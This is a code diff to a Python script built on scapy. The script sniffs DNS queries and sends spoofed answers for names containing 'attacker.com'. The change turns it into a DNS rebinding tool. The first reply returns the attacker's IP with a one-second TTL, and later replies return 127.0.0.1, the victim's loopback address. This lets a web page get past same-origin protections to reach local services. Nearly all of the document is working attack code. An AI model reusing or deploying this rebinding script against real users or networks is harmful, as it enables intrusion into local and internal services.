@@ -9,9 +9,18 @@ import threading, socket
 from scapy.all import sniff, send, IP, UDP, DNS, DNSRR, UDPerror
 
 attacker = "attacker.com"
+attacker_ip = "192.168.1.1"
+victim = "127.0.0.1"
+dns_ttl = 1
+
+global first_request
+global dns_id
 
 def dns_callback(pkt):
     if DNS in pkt and not UDPerror in pkt:
+        
+        global first_request
+        global dns_id
         
         ip=pkt.getlayer(IP)
         dns=pkt.getlayer(DNS)
@@ -21,9 +30,16 @@ def dns_callback(pkt):
         else:
             if dns.qd != None and attacker in dns.qd.qname:
                 
-                answer = IP(dst=ip.src,src=ip.dst)/UDP(dport=ip.sport,sport=ip.dport)/DNS(id=dns.id,qr=1,qd=dns.qd,an=DNSRR(rrname=dns.qd.qname, ttl=100, rdata="127.0.0.1"))#"192.168.1.199"))#
-                send(answer,loop=0)
-                return dns.summary()
+                if dns_id != dns.id:
+                    
+                    dns_id = dns.id
+                    ip_answer = attacker_ip if first_request else victim
+                    if first_request:
+                        first_request = False
+                    
+                    answer = IP(dst=ip.src,src=ip.dst)/UDP(dport=ip.sport,sport=ip.dport)/DNS(id=dns.id,qr=1,qd=dns.qd,an=DNSRR(rrname=dns.qd.qname, ttl=dns_ttl, rdata=ip_answer))
+                    send(answer,loop=0)
+                    return dns.summary()
 
 class ListenThread ( threading.Thread ):
     
@@ -48,6 +64,10 @@ class ListenThread ( threading.Thread ):
         udps.close()
 
 if __name__ == '__main__':
+    
+    first_request = True
+    dns_id = -1
+
     lt = ListenThread()
     lt.deamon = True
     lt.start()
